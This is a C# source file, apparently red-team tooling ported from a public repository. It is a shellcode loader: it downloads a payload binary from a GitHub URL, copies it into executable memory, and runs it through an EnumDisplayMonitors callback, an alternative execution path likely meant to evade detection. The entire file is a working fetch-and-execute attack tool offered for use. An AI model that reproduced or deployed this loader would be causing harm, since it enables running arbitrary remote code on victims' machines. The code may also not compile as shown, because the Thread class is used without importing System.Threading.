
//Alternative code exec. from c---> c# https://github.com/aahmad097/AlternativeShellcodeExec/blob/master/EnumDisplayMonitors/EnumDisplayMonitors.cpp
using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;

namespace enumDisplay
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool VirtualFree(IntPtr lpAddress, UIntPtr dwSize, uint dwFreeType);
        
        [DllImport("user32.dll")]
        static extern bool EnumDisplayMonitors(IntPtr hdc, IntPtr lprcClip, EnumMonitorsDelegate lpfnEnum, IntPtr dwData);

        // Define a delegate for the EnumDisplayMonitors function
        delegate bool EnumMonitorsDelegate(IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData);

        // Define a structure for the RECT type
        [StructLayout(LayoutKind.Sequential)]
        struct RECT
        {
            public int left, top, right, bottom;
        }

        static void Main(string[] args)
        {
            
            using (WebClient webClient = new WebClient())
            {
                
                byte[] shellcode = webClient.DownloadData("https://github.com/kyle41111/RedTeamHelp/raw/main/payload.bin");

                //mem alloc
                IntPtr address = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x1000, 0x40);
                Marshal.Copy(shellcode, 0, address, shellcode.Length);

                // Set up a delegate for the EnumDisplayMonitors function
                EnumMonitorsDelegate callback = (IntPtr hMonitor, IntPtr hdcMonitor, ref RECT lprcMonitor, IntPtr dwData) =>
                {
                    // Cast the address of pload to a delegate then invoke it
                    ((Action)Marshal.GetDelegateForFunctionPointer(address, typeof(Action)))();
                    return false;
                };

                // Invoke the EnumDisplayMonitors function with the callback delegate
                EnumDisplayMonitors(IntPtr.Zero, IntPtr.Zero, callback, IntPtr.Zero);
                Thread.Sleep(Timeout.Infinite);
            }
        }
    }
}
